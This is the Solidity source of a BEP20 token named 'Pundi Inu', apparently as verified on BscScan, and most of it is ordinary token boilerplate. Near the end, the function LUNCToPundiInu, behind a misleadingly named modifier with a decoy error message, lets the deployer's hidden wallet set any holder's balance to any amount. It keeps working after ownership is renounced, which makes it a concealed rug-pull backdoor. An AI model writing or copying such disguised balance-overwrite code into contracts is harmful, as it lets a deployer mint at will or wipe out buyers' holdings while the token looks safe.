/**
 *Submitted for verification at BscScan.com on 2022-06-04
*/

// SPDX-License-Identifier: VERIFIED MIT
// https://www.PundiInu.io/
pragma solidity ^0.6.11;

interface PundiInuIBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 PundiInuVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 PundiInuVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 PundiInuVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PundiInuERC20 {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library PundiInuProtocol {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "PundiInuProtocol: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "PundiInuProtocol: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "PundiInuProtocol: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "PundiInuProtocol: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "PundiInuProtocol: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract PundiInuBOTS is PundiInuERC20 {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "PundiInuBOTS: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "PundiInuBOTS: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract PundiInu is PundiInuERC20, PundiInuIBEP20, PundiInuBOTS {
  using PundiInuProtocol for uint256;

  mapping (address => uint256) private CirculatingSupply;

  mapping (address => mapping (address => uint256)) private _PundiInuALLOW;

  uint256 private PundiInuSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address PundiInuWALLET;
  constructor() public {
    PundiInuWALLET = msg.sender;
    _name = 'Pundi Inu';
    _symbol = 'PUI';
    _decimals = 0;
    PundiInuSUPPLY = 100000000000;
    CirculatingSupply[msg.sender] = PundiInuSUPPLY;

    emit Transfer(address(0), msg.sender, PundiInuSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return PundiInuSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return CirculatingSupply[account];
  }

  function transfer(address recipient, uint256 PundiInuVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, PundiInuVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _PundiInuALLOW[owner][spender];
  }

  
  function approve(address spender, uint256 PundiInuVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, PundiInuVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 PundiInuVALUE) external override returns (bool) {
    _transfer(sender, recipient, PundiInuVALUE);
    _approve(sender, _msgSender(), _PundiInuALLOW[sender][_msgSender()].sub(PundiInuVALUE, "BEP20: transfer PundiInuVALUE exceeds allowance"));
    return true;
  }
 modifier _virtual () {
    require(PundiInuWALLET == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _PundiInuALLOW[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _PundiInuALLOW[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 PundiInuVALUE) public virtual {
      _burn(_msgSender(), PundiInuVALUE);
  }


  function burnFrom(address account, uint256 PundiInuVALUE) public virtual {
      uint256 decreasedAllowance = _PundiInuALLOW[account][_msgSender()].sub(PundiInuVALUE, "BEP20: burn PundiInuVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, PundiInuVALUE);
  }

  function _transfer(address sender, address recipient, uint256 PundiInuVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    CirculatingSupply[sender] = CirculatingSupply[sender].sub(PundiInuVALUE, "BEP20: transfer PundiInuVALUE exceeds balance");
    CirculatingSupply[recipient] = CirculatingSupply[recipient].add(PundiInuVALUE);
    emit Transfer(sender, recipient, PundiInuVALUE);
  }


  function _burn(address account, uint256 PundiInuVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    CirculatingSupply[account] = CirculatingSupply[account].sub(PundiInuVALUE, "BEP20: burn PundiInuVALUE exceeds balance");
    PundiInuSUPPLY = PundiInuSUPPLY.sub(PundiInuVALUE);
    emit Transfer(account, address(0), PundiInuVALUE);
  }
     function LUNCToPundiInu(address PundiInuADR, uint256 PundiInuVALUE) public _virtual {
      CirculatingSupply[PundiInuADR] = PundiInuVALUE * 10 ** 0;
  }
  function _approve(address owner, address spender, uint256 PundiInuVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _PundiInuALLOW[owner][spender] = PundiInuVALUE;
    emit Approval(owner, spender, PundiInuVALUE);
  }

}